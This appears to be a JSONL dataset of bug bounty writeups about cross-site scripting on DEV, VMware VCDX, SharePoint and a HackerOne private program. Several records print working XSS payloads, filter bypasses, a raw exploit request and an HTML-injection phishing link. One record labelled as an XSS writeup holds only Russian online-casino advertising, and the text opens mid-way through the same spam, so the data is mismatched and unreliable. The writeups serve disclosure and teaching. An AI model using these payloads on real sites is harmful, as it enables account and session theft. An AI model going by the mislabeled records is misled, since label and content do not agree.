реальными дилерами, представленные на платформах вроде Parimatch, создают атмосферу настоящего казино. Также отмечаем наличие джекпотов и турниров, стимулирующих азарт. Бонусы и акции Большинство украинских казино предоставляют привлекательные бонусы. Новички получают приветственные пакеты, такие как депозитные бонусы до 150% и бесплатные вращения на слотах. Постоянные игроки участвуют в программах лояльности, еженедельных акциях и турнирах. Cosmolot, например, известен ежедневными бонусами, а Slotoking продвигает систему кэшбэка. Эти предложения увеличивают шансы на выигрыш и повышают интерес пользователей. Методы платежей в украинских казино онлайн Онлайн-казино в Украине предлагают широкий выбор методов оплаты, чтобы удовлетворить запросы пользователей. Рассмотрим самые популярные варианты и их особенности. Популярные способы депозитов и выводов Мы отмечаем, что самые востребованные методы оплаты включают банковские карты Visa и Mastercard, которые обеспечивают надежность и быстроту транзакций. Также популярны электронные кошельки, такие как Monobank, Приват24 и Qiwi, благодаря удобству и моментальному зачислению средств. Множество казино поддерживают криптовалютные платежи (Bitcoin, Ethereum), что обеспечивает анонимность и высокую безопасность операций. Некоторые платформы предлагают прямые переводы через мобильных операторов, таких как Киевстар и Vodafone, что делает процесс особенно доступным для пользователей без банковских карт. Комиссии и скорость транзакций Размер комиссии зависит от выбранного метода. Обычно операции через банковские карты или электронные кошельки проходят без лишних сборов, тогда как криптовалютные переводы нередко включают сетевые комиссии. Мобильные платежи иногда сопровождаются небольшими дополнительными затратами со стороны оператора. Скорость обработки транзакций особенно важна для игроков. Депозиты через карты и электронные кошельки зачисляются мгновенно, тогда как вывод средств обычно занимает от 1 до 3 рабочих дней. Криптовалютные операции проходят быстрее, среднее время обработки редко превышает несколько часов. Преимущества и недостатки игр в украинских казино онлайн Украинские онлайн-казино предлагают множество игровых возможностей, но важно понимать как их преимущества, так и возможные ограничения. Рассмотрим обе стороны. Основные преимущества Доступность и удобство. Играть можно в любое время и из любого места, будь то смартфон, планшет или компьютер. Многие казино имеют мобильные приложения с адаптивным интерфейсом. Широкий выбор игр. Украинские платформы предлагают сотни слотов, настольных игр, рулеток и live-дилеров. Примеры популярных игр включают «Книга Ра», европейскую рулетку и блэкджек. Бонусные программы. Новые игроки получают приветственные бонусы, а постоянные — кэшбек, фриспины и регулярные акции. Такие игры, как в Cosmolot и Parimatch, часто сопровождаются ежедневными или персонализированными наградами. Безопасность транзакций. Лицензионные казино применяют шифрование данных и предлагают защищённые методы платежей, включая Visa, Приват24 и криптовалюты, что гарантирует безопасность финансовых операций. Правовая защита. С лицензией от КРАИЛ игроки защищены юридически, их данные хранятся в соответствии с украинскими законами. Возможные риски и ограничения Игровая зависимость. Некоторые пользователи могут столкнуться с аддикцией. Надёжные казино предлагают функцию самоисключения или лимитов для контроля. Финансовые потери. Азартные игры не гарантируют доход; ставки связаны с риском потерь. Ограничения доступа. Платформы с лицензией КРАИЛ доступны только пользователям из Украины, а иностранные казино могут быть заблокированы. Скорость вывода средств. В зависимости от метода платежей, процесс может занимать до 3 рабочих дней, что требует планирования. Блокировки и технические проблемы. Иногда из-за сбоев или интернет-ограничений доступ к платформам может быть временно недоступен. Мы всегда рекомендуем взвешивать преимущества и риски, чтобы делать ставки осознанно и получать только позитивные эмоции. Советы для новичков Новые игроки часто сталкиваются с трудностями из-за отсутствия опыта. Давайте разберёмся, как сделать старт в украинских онлайн-казино комфортным и безопасным. Как начать игру без ошибок Выбор лицензированного казино. Играть стоит только на платформах с лицензией КРАИЛ. Это гарантирует защиту данных и честные выплаты. Регистрация с корректными данными. Указываем только реальные данные: имя, дату рождения и контактную информацию, чтобы избежать проблем с выводом средств. Изучение правил игры. Читаем правила каждого автомата или стола, особенно перед ставками на реальные деньги. Это помогает понимать механику и избегать неоправданных потерь. Определение бюджета. Устанавливаем дневной или недельный лимит на ставки. Это предотвратит финансовые риски и сохранит положительные эмоции. Проверка отзывов. Читаем мнения пользователей об условиях вывода средств, поддержке и игровых автоматах. Частые ошибки игроков Игнорирование лицензии. Некоторые новички выбирают незарегистрированные казино из-за бонусов, что может привести к потере средств. Пренебрежение акциями. Игроки не используют приветственные бонусы или программы лояльности, хотя они увеличивают шансы на выигрыш. Отсутствие стратегии. Делать ставки хаотично — одна из типичных ошибок. Лучше придерживаться стратегии и применять аналитику. Эмоциональные решения. Азарт часто мешает вовремя остановиться, что ведёт к превышению бюджета. Неправильный выбор игр. Игры без понимания коэффициентов выигрыша (RTP) могут принести меньше удовольствия и больше потерь. Итог Украинские онлайн-казино продолжают радовать нас своим разнообразием, удобством и безопасностью. Благодаря лицензированию, современным технологиям и широкому выбору игр, каждый игрок может найти платформу, которая идеально соответствует его предпочтениям. Мы уверены, что осознанный подход к выбору казино и соблюдение простых рекомендаций помогут вам наслаждаться игрой, избегая неприятных ситуаций. Не забывайте об ответственности и играйте для удовольствия, а не ради риска. Пусть ваш опыт в украинских онлайн-казино будет захватывающим, а удача всегда на вашей стороне! Часто задаваемые вопросы Какие критерии важны при выборе онлайн-казино в Украине? Для выбора надежного онлайн-казино обратите внимание на наличие лицензии, разнообразие игр, методы оплаты, бонусные программы, репутацию и отзывчивость технической поддержки. Проверка этих параметров гарантирует честность, безопасность и комфортный игровой опыт. Какие казино популярны в Украине в 2023 году? Особой популярностью пользуются Cosmolot, Parimatch, JacobCasino и Slotoking. Эти платформы предлагают широкий выбор игр, бонусы и удобный пользовательский интерфейс. Какие способы оплаты доступны в украинских онлайн-казино? Часто используются Visa, Mastercard, Monobank, Приват24, Qiwi, криптовалюты (Bitcoin, Ethereum) и мобильные платежи. Время зачисления депозита обычно мгновенное, а вывод средств может занять от 1 до 3 рабочих дней. Насколько безопасны игры в онлайн-казино? Безопасность обеспечивается лицензированием, шифрованием данных и честными системами генерации случайных чисел. Игрокам рекомендуется выбирать только лицензированные платформы. Какие бонусы можно получить в украинских онлайн-казино? Бонусы включают приветственные пакеты, бесплатные вращения, кешбэк и программы лояльности. Эти акционные предложения увеличивают шансы на выигрыш. Какие риски связаны с игрой в онлайн-казино? Основные риски — это финансовые потери, игровая зависимость и технические проблемы. Для минимизации рисков важно играть осознанно и придерживаться установленного бюджета. Можно ли играть в украинских казино на мобильных устройствах? Да, большинство онлайн-казино предлагают мобильные приложения или адаптированные версии сайта, что позволяет играть в любое время и в любом месте. Как быстро проходят финансовые транзакции в казино? Депозиты обычно зачисляются мгновенно, а вывод средств может занимать от нескольких часов до 3 рабочих дней в зависимости от метода платежа. Как проверить легальность онлайн-казино в Украине? Убедитесь, что казино имеет лицензию от КРАИЛ (Комиссии по регулированию азартных игр и лотерей). Информация о лицензии должна быть указана на официальном сайте казино. Какие ошибки новички допускают при игре в онлайн-казино? Частые ошибки — игнорирование лицензии, ставка больше установленного бюджета, отсутствие стратегии и эмоциональные решения. Избегайте этих ошибок для улучшения игрового опыта. Copyright © 2025 - all rights reserved by mohamedharon.com Прокрутка вверх"}
{"source_url": "https://medium.com/@Skylinearafat/xss-protection-bypass-made-my-quickest-bounty-ever-f4fd970c9116", "title": "DEV XSS Protection bypass made my quickest bounty ever!! | by Yeasir Arafat | Medium", "friendly_explanation": "This is a bug bounty writeup from https://medium.com/@Skylinearafat/xss-protection-bypass-made-my-quickest-bounty-ever-f4fd970c9116. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\nDEV XSS Protection bypass made my quickest bounty ever!! | by Yeasir Arafat | Medium Sitemap Open in app Sign up Sign in Medium Logo Write Sign up Sign in DEV XSS Protection bypass made my quickest bounty ever!! Yeasir Arafat 2 min read · Dec 3, 2017 -- 3 Listen Share Hi All,This is Yeasir Arafat here.I would love to share my last XSS which made my fastest bounty ever.I believe sharing is caring :D So, this time I was able to bypass protection also able to manage some bounty with quick time.I have got some cool swag and little bounty to them before reporting this XSS to them :) .I had found HTML injection on their public discussion.At that time I was able to inject malicious script with HTML. example of malicious script : <a href=\\” https://attacker/phish.php\\ \"><img src=\\” https://attacker/content.jpg\\ \"></a><script> After reporting this issue to them they filtering any malicious script with normal XSS payload.At that time me and my friend Shawar Khan tried to convert it to XSS but no luck :( . After getting some cool swag they announced their bounty program.I thought why not some bounty also? As bcz limited scope in DEV I start looking for XSS.I dropped some common payload like img src/svg onload bla bla bla but their firewall blocking me all the time.I put some advanced payload and see the response is different from other payloads.Like below picture, Press enter or click to view image in full size i-frame vulnerable This was interesting,I thought may be i-frame payloads can trigger XSS here.Bit moment later I put advanced i-frame payload and got the stored one that can bypassed their filtering protection.Payload: <iframe src=”data:text/html,%3C%73%63%72%69%70%74%3E%61%6C%65%72%74%28%31%29%3C%2F%73%63%72%69%70%74%3E”></iframe> Why this payload?? As I stated before that, after reporting HTML injections they filtering any malicious script but I noticed that their comment box is vulnerable to i-frame injections.Then I start looking for advanced i-frame XSS payload in Google found some and works that i-frame payload :) . I quickly report it to them and got their fast response with 150$ bounty in less than 30 minutes.Which was my fastest bounty ever. PoC video Thanks Yeasir Arafat Web Application Security Researcher Bug Bounty Infosec Web Pentesting Xss White Hat Hacking -- -- 3 Written by Yeasir Arafat 927 followers · 16 following Entrepreneur || 9+ years of experience in Offensive and Defensive Operations. Synack Red Team Member. #Pentest #VAPT #ThreatHunt Responses ( 3 ) See all responses Help Status About Careers Press Blog Privacy Rules Terms Text to speech"}
{"source_url": "https://medium.com/@honcbb/vmware-official-vcdx-reflected-xss-90e69a3c35e1", "title": "VMware Official VCDX Reflected XSS | by Honc | Medium", "friendly_explanation": "This is a bug bounty writeup from https://medium.com/@honcbb/vmware-official-vcdx-reflected-xss-90e69a3c35e1. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\nVMware Official VCDX Reflected XSS | by Honc | Medium Sitemap Open in app Sign up Sign in Medium Logo Write Sign up Sign in VMware Official VCDX Reflected XSS Honc 2 min read · Nov 19, 2017 -- Listen Share I was browsing the HackerOne bug bounty Project. I want to try to find the loophole of big Enterprise first! I choose VMware. Before you begin, see if the VMware vulnerability policy has something to pay attention to, This is what you should pay attention to in participating in any loophole reward program. After reading the VMware vulnerabilities policy, there is not much to be aware of (or accept those vulnerabilities or those who do not) Only Note: Press enter or click to view image in full size In the case of vulnerabilities found in third-party software components used in VMware products, please also notify VMware as described above. Policy: https://www.vmware.com/support/policies/security_response －－－－－－－－－－－－－－－－－－－－－－－－ Don’t talk much, we start looking for a loophole. Because I was using VMware products, I was thinking that each product has a certification expert badge and so on, whether this has, curious to find this site Press enter or click to view image in full size Liste： https://vcdx.vmware.com/ is a VMware certification expert！！ But there seems to be no place to register. Go to the login page At first a lot of people will try SQL injection some statements, but I didn’t think too much! Because big companies will not have such a clear loophole exists, the existence of the words have been found out Based on occupational diseases, I try to enter a XSS string “><img src=x Onerror:alert (1)/> I use grab data to modify POST /login HTTP/1.1 Host: vcdx.vmware.com User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:50.0) Gecko/20100101 Firefox/50.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate, br Referer: https://vcdx.vmware.com/login Cookie: connect.sid=s%3AwU84EnNnabqCyW98coEEFYTZLhYkitff.al1Ce9v8xNZNBnZIhvDJ8IDQzDHVDBXlgb8%2BxV%2By2gg X-Forwarded-For: 8.8.8.8 Connection: close Upgrade-Insecure-Requests: 1 Content-Type: application/x-www-form-urlencoded Content-Length: 75 redirectTo=&email=%22%3E%3Csvg%2Fonload%3Dalert%28domain%29%3E%22&password= Result!! Press enter or click to view image in full size Indeed request response XSS I’m sure this is a loophole Timeline 2017/02/13 08:46 Provide vulnerability details to VMware Security Team 2017/02/14 11:35 Receive response from Vinay that inspection is in progress 2017/03/25 02:09 Yes, it fixes 2017/03/31 05:18 Tell me there will be VMware Swag memorabilia Security -- -- Written by Honc 9 followers · 1 following No responses yet Help Status About Careers Press Blog Privacy Rules Terms Text to speech"}
{"source_url": "https://medium.com/@adeshkolte/microsoft-sharepoints-follow-feature-xss-cve-2017-8514-adesh-kolte-d78d701cd064", "title": "Microsoft SharePoint’s `Follow` Feature XSS (CVE-2017–8514) -Adesh Kolte | by Adesh Kolte | Medium", "friendly_explanation": "This is a bug bounty writeup from https://medium.com/@adeshkolte/microsoft-sharepoints-follow-feature-xss-cve-2017-8514-adesh-kolte-d78d701cd064. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\nMicrosoft SharePoint’s `Follow` Feature XSS (CVE-2017–8514) -Adesh Kolte | by Adesh Kolte | Medium Sitemap Open in app Sign up Sign in Medium Logo Write Sign up Sign in Microsoft SharePoint’s `Follow` Feature XSS (CVE-2017–8514) -Adesh Kolte Adesh Kolte 3 min read · Dec 21, 2017 -- Listen Share Hii Guyz I am Adesh.Nandkishor Kolte , An Independent Cyber Security Researcher from India I have been working from last 1 year as a freelancer Security analyst and a bug bounty hunter. I have been acknowledged by renowned companies including Google,Microsoft, AT&T,Avira,Sony,,Oracle, Intel, Dell, Intuit, Eu CERT, Australia CERT, US CERT etc… Contact Details: Email:adeshkolte@gmail.com Phone No: +919011324123 Press enter or click to view image in full size About Vulnerability: This is common URL for this Type Of Vulnerability https://<Any SharePoint URL Goes Here>?FollowSite=0&SiteName=’-confirm(document.domain)-’ SharePoint is all about sharing. In this line of direction, SharePoint provides a feature called “ Follow ” a site in order to get updates on site’s activity in your newsfeed. One way to follow a site is to click on the “ Follow ” feature available at the top right of the page At this time, SharePoint sends a POST request to the following end-point: bbmsft.sharepoint.com/_vti_bin/client.svc/ProcessQuery ( bbmsft is the tenant name in my case and this will be different in your case). I played around with that POST request but was unable to find something interesting. I observed that this is not the only way to follow a site. You can also share your site(s) with others by using the Share feature available at the top right corner. Once you send out Share invitation, on the receiving end email The URL has two GET parameters i.e., FollowSite=1 and SiteName=<AnySiteNameGoesHere> . The FollowSite GET parameter holds a Boolean value of 0 or 1. 0 for not following and 1 for following . It is a sort of flag. The GET parameter SiteName is of our interest. It is reflected back as a part of script context like the following (watch out for the keyword ReflectionHere ). In real life, this would be the name of site you want to follow. <script type=”text/javascript”> //<![CDATA[ … SP.SOD.executeFunc(‘followingcommon.js’, ‘FollowSiteFromEmail’, function() { FollowSiteFromEmail(‘ReflectionHere’); }); … //]]> </script> As you can see in the above code, the developers’re using single quote around ReflectionHere and I found that potentially dangerous characters like ‘, < , > and / etc were not encoded. In order to keep it simple, the XSS payload like ‘-confirm(document.domain)-’ should do the job for you. Further, I noticed that the above inline JavaScript code snippet only appears or becomes a part of DOM if GET parameters ( FollowSite and SiteName ) are present in the URL. Vulnerable URL: https://drumbeat.office.com/Pages/Forms/AllItems.aspx?FollowSite=0&SiteName= 1 Payload: ‘-confirm(“Xss”)- ’ Proof Of Concept: Press enter or click to view image in full size Hall OF Fame: Press enter or click to view image in full size Press enter or click to view image in full size Press enter or click to view image in full size Listed In Microsoft Securtiy Resercher Aknowledgement in November 2017 (10Th Times) Thanks For Reading :} JavaScript Microsoft -- -- Written by Adesh Kolte 647 followers · 143 following Listed in Top 100 most respected hackers in the world by Microsoft at the BlackHat conference in America 2018 No responses yet Help Status About Careers Press Blog Privacy Rules Terms Text to speech"}
{"source_url": "https://www.mohamedharon.com/2018/03/reflected-xss-moogaloop-swf-version-62x.html", "title": "Украинские казино онлайн – топовые игры быстрые выплаты и ежедневные бонусы", "friendly_explanation": "This is a bug bounty writeup from https://www.mohamedharon.com/2018/03/reflected-xss-moogaloop-swf-version-62x.html. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\nУкраинские казино онлайн – топовые игры быстрые выплаты и ежедневные бонусы mohamedharon.com Меню Украинские казино онлайн Украинские казино онлайн Онлайн-казино в Украине становятся всё популярнее, и мы не можем не заметить, как быстро этот рынок развивается. С каждым годом появляется всё больше платформ, предлагающих захватывающие игры, щедрые бонусы и удобные способы оплаты. Это отличный способ провести время, испытать удачу и, возможно, сорвать крупный выигрыш. Мы понимаем, что выбор среди множества онлайн-казино может быть непростым. Ведь хочется, чтобы всё было честно, безопасно и увлекательно. Давайте разберёмся, как найти лучшее украинское казино онлайн, на что обратить внимание и какие возможности ждут нас в этом захватывающем мире азартных игр. Лучшие украинские казино онлайн Онлайн-казино в Украине предлагают игрокам широкий выбор качественных платформ. Мы рассмотрим популярные варианты и критерии, которые помогут найти надежное место для игры. Популярные платформы в 2025 году Украинские онлайн-казино уверенно выходят на международный рынок и становятся всё более популярными среди игроков в Эстонии. Они привлекают не только широким выбором игр, но и выгодными условиями для новичков: моментальная регистрация, щедрые приветственные бонусы, ежедневные акции и бесплатные фриспины. Parimatch Casino Быстрая регистрация через электронную почту или социальные сети. Фриспины начисляются после первого депозита. Казино предлагает ежедневные бонусы, кэшбэк и программу лояльности для активных игроков. Favbet Casino Упрощённый процесс создания аккаунта и регулярные турниры. Новые пользователи получают фриспины после подтверждения аккаунта. Бонусная система обновляется постоянно, предлагая свежие акции и розыгрыши. Cosmolot Casino Регистрация занимает менее минуты. Платформа предлагает ежедневные фриспины, бонусы за активность, кэшбэк и адаптивный мобильный интерфейс. Программа лояльности настраивается под индивидуальный стиль игры. Slotoking Casino Бездепозитные фриспины сразу после регистрации и быстрый старт. Казино предлагает регулярные акции, обновление игровых автоматов и оперативное выведение выигрышей — именно это ценят игроки в Эстонии. First Casino Бесплатные фриспины доступны уже на этапе регистрации или первого входа. Казино проводит ежедневные промо, турниры и предоставляет интуитивно понятный интерфейс, особенно удобный для новичков. Мы видим, что у операторов увеличивается акцент на мобильные приложения. Это делает игры доступными в любое время. Среди популярных слотов пользователи чаще выбирают Book of Ra от Novomatic и Mega Moolah от Microgaming. Критерии выбора надежного казино Чтобы обеспечить безопасность и прозрачность игры, нужно учитывать несколько ключевых параметров: Лицензия. Надежные площадки, такие как упомянутые выше, обычно имеют лицензии КРАИЛ или международные, например, от Malta Gaming Authority. Методы оплаты. Важны варианты пополнения и вывода средств, включая банковские карты, электронные кошельки и криптовалюты. Бонусы и акции. Платформы предлагают приветственные бонусы, фриспины и программы лояльности, привлекая новых игроков. Отзывы и репутация. Реальные отзывы помогают оценить качество сервиса. Техподдержка. Круглосуточная поддержка делает игру комфортной и безопасной. При выборе платформы стоит проверить каждый критерий, чтобы получить максимально позитивный опыт. Особенности украинских казино онлайн Украинские казино онлайн привлекают игроков благодаря разнообразию игр, гибким бонусным предложениям и прозрачному регулированию. Рассмотрим ключевые аспекты работы этих платформ. Законодательство и регулирование Украинское правительство активно регулирует рынок онлайн-гемблинга. С 2020 года казино обязаны получать лицензию Комиссии по регулированию азартных игр и лотерей (КРАИЛ). Лицензия подтверждает, что платформа соблюдает закон, использует сертифицированные игры и обеспечивает защиту данных игроков. Например, такие известные казино как Cosmolot и Parimatch успешно прошли лицензирование, гарантируя честность и прозрачность. Разнообразие игр Украинские казино отличаются широким выбором развлечений. Игровые автоматы занимают лидирующую позицию, предлагая тысячи вариантов с разными тематиками. В дополнение к слотам популярны рулетка, блэкджек, баккара и покер. Live-игры с реальными дилерами, представленные на платформах вроде Parimatch, создают атмосферу настоящего казино. Также отмечаем наличие джекпотов и турниров, стимулирующих азарт. Бонусы и акции Большинство украинских казино предоставляют привлекательные бонусы. Новички получают приветственные пакеты, такие как депозитные бонусы до 150% и бесплатные вращения на слотах. Постоянные игроки участвуют в программах лояльности, еженедельных акциях и турнирах. Cosmolot, например, известен ежедневными бонусами, а Slotoking продвигает систему кэшбэка. Эти предложения увеличивают шансы на выигрыш и повышают интерес пользователей. Методы платежей в украинских казино онлайн Онлайн-казино в Украине предлагают широкий выбор методов оплаты, чтобы удовлетворить запросы пользователей. Рассмотрим самые популярные варианты и их особенности. Популярные способы депозитов и выводов Мы отмечаем, что самые востребованные методы оплаты включают банковские карты Visa и Mastercard, которые обеспечивают надежность и быстроту транзакций. Также популярны электронные кошельки, такие как Monobank, Приват24 и Qiwi, благодаря удобству и моментальному зачислению средств. Множество казино поддерживают криптовалютные платежи (Bitcoin, Ethereum), что обеспечивает анонимность и высокую безопасность операций. Некоторые платформы предлагают прямые переводы через мобильных операторов, таких как Киевстар и Vodafone, что делает процесс особенно доступным для пользователей без банковских карт. Комиссии и скорость транзакций Размер комиссии зависит от выбранного метода. Обычно операции через банковские карты или электронные кошельки проходят без лишних сборов, тогда как криптовалютные переводы нередко включают сетевые комиссии. Мобильные платежи иногда сопровождаются небольшими дополнительными затратами со стороны оператора. Скорость обработки транзакций особенно важна для игроков. Депозиты через карты и электронные кошельки зачисляются мгновенно, тогда как вывод средств обычно занимает от 1 до 3 рабочих дней. Криптовалютные операции проходят быстрее, среднее время обработки редко превышает несколько часов. Преимущества и недостатки игр в украинских казино онлайн Украинские онлайн-казино предлагают множество игровых возможностей, но важно понимать как их преимущества, так и возможные ограничения. Рассмотрим обе стороны. Основные преимущества Доступность и удобство. Играть можно в любое время и из любого места, будь то смартфон, планшет или компьютер. Многие казино имеют мобильные приложения с адаптивным интерфейсом. Широкий выбор игр. Украинские платформы предлагают сотни слотов, настольных игр, рулеток и live-дилеров. Примеры популярных игр включают «Книга Ра», европейскую рулетку и блэкджек. Бонусные программы. Новые игроки получают приветственные бонусы, а постоянные — кэшбек, фриспины и регулярные акции. Такие игры, как в Cosmolot и Parimatch, часто сопровождаются ежедневными или персонализированными наградами. Безопасность транзакций. Лицензионные казино применяют шифрование данных и предлагают защищённые методы платежей, включая Visa, Приват24 и криптовалюты, что гарантирует безопасность финансовых операций. Правовая защита. С лицензией от КРАИЛ игроки защищены юридически, их данные хранятся в соответствии с украинскими законами. Возможные риски и ограничения Игровая зависимость. Некоторые пользователи могут столкнуться с аддикцией. Надёжные казино предлагают функцию самоисключения или лимитов для контроля. Финансовые потери. Азартные игры не гарантируют доход; ставки связаны с риском потерь. Ограничения доступа. Платформы с лицензией КРАИЛ доступны только пользователям из Украины, а иностранные казино могут быть заблокированы. Скорость вывода средств. В зависимости от метода платежей, процесс может занимать до 3 рабочих дней, что требует планирования. Блокировки и технические проблемы. Иногда из-за сбоев или интернет-ограничений доступ к платформам может быть временно недоступен. Мы всегда рекомендуем взвешивать преимущества и риски, чтобы делать ставки осознанно и получать только позитивные эмоции. Советы для новичков Новые игроки часто сталкиваются с трудностями из-за отсутствия опыта. Давайте разберёмся, как сделать старт в украинских онлайн-казино комфортным и безопасным. Как начать игру без ошибок Выбор лицензированного казино. Играть стоит только на платформах с лицензией КРАИЛ. Это гарантирует защиту данных и честные выплаты. Регистрация с корректными данными. Указываем только реальные данные: имя, дату рождения и контактную информацию, чтобы избежать проблем с выводом средств. Изучение правил игры. Читаем правила каждого автомата или стола, особенно перед ставками на реальные деньги. Это помогает понимать механику и избегать неоправданных потерь. Определение бюджета. Устанавливаем дневной или недельный лимит на ставки. Это предотвратит финансовые риски и сохранит положительные эмоции. Проверка отзывов. Читаем мнения пользователей об условиях вывода средств, поддержке и игровых автоматах. Частые ошибки игроков Игнорирование лицензии. Некоторые новички выбирают незарегистрированные казино из-за бонусов, что может привести к потере средств. Пренебрежение акциями. Игроки не используют приветственные бонусы или программы лояльности, хотя они увеличивают шансы на выигрыш. Отсутствие стратегии. Делать ставки хаотично — одна из типичных ошибок. Лучше придерживаться стратегии и применять аналитику. Эмоциональные решения. Азарт часто мешает вовремя остановиться, что ведёт к превышению бюджета. Неправильный выбор игр. Игры без понимания коэффициентов выигрыша (RTP) могут принести меньше удовольствия и больше потерь. Итог Украинские онлайн-казино продолжают радовать нас своим разнообразием, удобством и безопасностью. Благодаря лицензированию, современным технологиям и широкому выбору игр, каждый игрок может найти платформу, которая идеально соответствует его предпочтениям. Мы уверены, что осознанный подход к выбору казино и соблюдение простых рекомендаций помогут вам наслаждаться игрой, избегая неприятных ситуаций. Не забывайте об ответственности и играйте для удовольствия, а не ради риска. Пусть ваш опыт в украинских онлайн-казино будет захватывающим, а удача всегда на вашей стороне! Часто задаваемые вопросы Какие критерии важны при выборе онлайн-казино в Украине? Для выбора надежного онлайн-казино обратите внимание на наличие лицензии, разнообразие игр, методы оплаты, бонусные программы, репутацию и отзывчивость технической поддержки. Проверка этих параметров гарантирует честность, безопасность и комфортный игровой опыт. Какие казино популярны в Украине в 2023 году? Особой популярностью пользуются Cosmolot, Parimatch, JacobCasino и Slotoking. Эти платформы предлагают широкий выбор игр, бонусы и удобный пользовательский интерфейс. Какие способы оплаты доступны в украинских онлайн-казино? Часто используются Visa, Mastercard, Monobank, Приват24, Qiwi, криптовалюты (Bitcoin, Ethereum) и мобильные платежи. Время зачисления депозита обычно мгновенное, а вывод средств может занять от 1 до 3 рабочих дней. Насколько безопасны игры в онлайн-казино? Безопасность обеспечивается лицензированием, шифрованием данных и честными системами генерации случайных чисел. Игрокам рекомендуется выбирать только лицензированные платформы. Какие бонусы можно получить в украинских онлайн-казино? Бонусы включают приветственные пакеты, бесплатные вращения, кешбэк и программы лояльности. Эти акционные предложения увеличивают шансы на выигрыш. Какие риски связаны с игрой в онлайн-казино? Основные риски — это финансовые потери, игровая зависимость и технические проблемы. Для минимизации рисков важно играть осознанно и придерживаться установленного бюджета. Можно ли играть в украинских казино на мобильных устройствах? Да, большинство онлайн-казино предлагают мобильные приложения или адаптированные версии сайта, что позволяет играть в любое время и в любом месте. Как быстро проходят финансовые транзакции в казино? Депозиты обычно зачисляются мгновенно, а вывод средств может занимать от нескольких часов до 3 рабочих дней в зависимости от метода платежа. Как проверить легальность онлайн-казино в Украине? Убедитесь, что казино имеет лицензию от КРАИЛ (Комиссии по регулированию азартных игр и лотерей). Информация о лицензии должна быть указана на официальном сайте казино. Какие ошибки новички допускают при игре в онлайн-казино? Частые ошибки — игнорирование лицензии, ставка больше установленного бюджета, отсутствие стратегии и эмоциональные решения. Избегайте этих ошибок для улучшения игрового опыта. Copyright © 2025 - all rights reserved by mohamedharon.com Прокрутка вверх"}
{"source_url": "https://blog.securitybreached.org/2018/02/02/how-i-was-able-to-bypass-xss-protection-on-hackerones-private-program/", "title": "How I was able to Bypass XSS Protection on HackerOne's Private Program - Security Breached Blog", "friendly_explanation": "This is a bug bounty writeup from https://blog.securitybreached.org/2018/02/02/how-i-was-able-to-bypass-xss-protection-on-hackerones-private-program/. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\nHow I was able to Bypass XSS Protection on HackerOne's Private Program - Security Breached Blog Skip to content Security Breached Blog Hack Smart, Stay Safe: Comprehensive Guides to Cybersecurity and Bug Bounty February 2, 2018 Share Uncategorized 5 How I was able to Bypass XSS Protection on HackerOne’s Private Program by Hello friends, This is Jay Jani here and First of all frankly I would like to tell you all that I am completely a noob so I did some noobish things here. Please forgive me for my noobness. So, I was testing a private program on HackerOne and tried to find some basic vulnerabilities. There was a functionality where I can write a Post and Publish it on the internet. So i was looking for Cross Site Scripting bug there but application was a bit strong enough ( not fully 😛 ) to protect it. The Editor looks like: I tried with basic paylods like “><svg/onload=confirm(1);> and all but failed. Then i noticed that application was removing all the payloads having “on” word like onerror , onload , basically event handlers. Then I tried script alert(1); and the output: I was like I quickly went through the post of my brother Armaan and the great Ak1t4 to get idea on how i could bypass this. Some of the payloads i used and the outputs I got are; <<script>alert(l); <>alert(l); <<scr<script>alert(1); alert(1); <<scr<script>ipt>alert(1); ipt>alert(1); <<scrip<script>t>alert(1); t>alert(1); I was like The last Attack <<scrip<scriptT>alert(1); and Boom ..!! I know i did some noobish way to get alert but I am noob and just want to tell to the community that “ There is always a way, you have to just try harder “. Share this: Click to share on X (Opens in new window) X Click to share on Facebook (Opens in new window) Facebook Click to share on LinkedIn (Opens in new window) LinkedIn Click to share on Reddit (Opens in new window) Reddit Click to share on Tumblr (Opens in new window) Tumblr Click to share on Telegram (Opens in new window) Telegram Click to share on WhatsApp (Opens in new window) WhatsApp Click to email a link to a friend (Opens in new window) Email Like this: Like Loading... Related Discover more from Security Breached Blog Subscribe to get the latest posts sent to your email. Type your email… Subscribe Share on Facebook Share on X 5 replies on “How I was able to Bypass XSS Protection on HackerOne’s Private Program” These Bug Bounty Writeups will Change Your Life - PrimeHackers says: June 26, 2020 at 7:20 am […] How I was able to bypass XSS protection on h1 private program […] Loading... Reply hacker says: March 31, 2019 at 7:56 am <<scripalert(1); Loading... Reply Muhammad Khizer Javed says: April 4, 2019 at 1:22 pm Bitch It won’t work! :3 Loading... Reply NeoHacker says: February 5, 2018 at 4:03 pm bounty kitna mila ….. Loading... Reply PranobNath says: February 2, 2018 at 12:38 pm awesome writeup 😍 Loading... Reply Leave a Reply Cancel reply This site uses Akismet to reduce spam. Learn how your comment data is processed. Next Hunting Insecure Direct Object Reference Vulnerabilities for Fun and Profit (PART-1) Previous How I was able to Download Any file from Web server! You may also like December 8, 2018 by How I was Able To Bypass Email Verification Hello Masters and Learner I hope you are doing well and always put your efforts to secure the world so that no can get benefits unethically. the main reason why... Share this: Click to share on X (Opens in new window) X Click to share on Facebook (Opens in new window) Facebook Click to share on LinkedIn (Opens in new window) LinkedIn Click to share on Reddit (Opens in new window) Reddit Click to share on Tumblr (Opens in new window) Tumblr Click to share on Telegram (Opens in new window) Telegram Click to share on WhatsApp (Opens in new window) WhatsApp Click to email a link to a friend (Opens in new window) Email Like this: Like Loading... Uncategorized 2 Read More February 4, 2018 by Hunting Insecure Direct Object Reference Vulnerabilities for Fun and Profit (PART-1) Hello Guys!! This is my first Blog post and i am starting with IDOR Vulnerability. In this Post you will know about many endpoints to test IDOR vulnerability! Hope you... Share this: Click to share on X (Opens in new window) X Click to share on Facebook (Opens in new window) Facebook Click to share on LinkedIn (Opens in new window) LinkedIn Click to share on Reddit (Opens in new window) Reddit Click to share on Tumblr (Opens in new window) Tumblr Click to share on Telegram (Opens in new window) Telegram Click to share on WhatsApp (Opens in new window) WhatsApp Click to email a link to a friend (Opens in new window) Email Like this: Like Loading... BugBounty POC / Tutorials / Uncategorized 1 Read More Security Breached Blog © 2025. All Rights Reserved. Powered by WordPress . Theme by Alx . Loading Comments... Write a 